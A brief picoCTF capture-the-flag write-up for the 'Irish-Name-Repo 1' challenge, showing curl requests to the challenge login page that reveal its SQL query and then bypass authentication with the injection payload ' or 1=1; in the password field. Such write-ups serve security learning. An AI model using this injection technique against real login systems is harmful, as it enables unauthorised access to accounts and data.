# ### Irish-Name-Repo 1

## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!
## Datos de acceso al nivel

## Solución
```bash
davidorado-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username=admin&password=hola&debug=1"
<pre>username: admin
password: hola
SQL query: SELECT * FROM users WHERE name='admin' AND password='hola'
davidorado-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username=admin&password=' or 1=1;&debug=1"
<pre>username: admin
password: ' or 1=1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1=1;'
```

## Notas adicionales

## Referencias